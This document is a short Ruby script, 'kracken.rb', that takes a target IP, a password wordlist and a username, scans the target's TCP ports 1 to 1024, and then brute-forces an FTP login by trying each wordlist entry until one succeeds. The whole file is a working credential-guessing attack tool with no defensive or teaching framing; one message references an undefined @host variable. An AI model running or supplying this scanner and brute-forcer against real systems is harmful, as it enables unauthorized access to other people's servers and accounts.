require "socket"
require "timeout"
require "colorize"
require "net/ftp"

ip = ARGV[0]
wordlist = ARGV[1]
user = ARGV[2]

if ip.nil? or wordlist.nil? or user.nil?
  puts "USAGE : ruby kracken.rb <ip> <wordlist> <user>".colorize(:yellow)

  exit 1
end

class Kraken
  def initialize(ip, wordlist, user)
    @ip = ip
    @wordlist = wordlist
    @user = user
  end

  def surf
    (1..1024).each do |port|
      Thread.new {
        begin
          Timeout.timeout 3 do
            s = TCPSocket.new(@ip, port)
            puts "[+] #{@ip} ::  #{port} Port || open".colorize(:green)
            sleep 1
            s.close
          end
        rescue Errno::ECONNREFUSED
          puts "[-] #{@ip} ::  #{port} Port || closed".colorize(:red)

          next
        rescue Timeout::Error
          puts "[!] #{@ip} :: #{port} Port || filtered/timeout".colorize(:blue)
        end
      }.join
    end
  end

  def attack
    puts "Trying to bruteforce #{@host}"
    sleep(1)
    puts "Engage"
    File.readlines(@wordlist).each do |word|
      word = word.chomp

      Thread.new {
        begin
          Net::FTP.open(@ip, @user, word)
          puts "Password found :: #{word}".colorize(:green)
          exit 0
        rescue
          puts "Trying #{word} on #{@ip}".colorize(:yellow)
        end
      }.join
    end
  end
end

bot = Kraken.new(ip, wordlist, user)
bot.surf
bot.attack
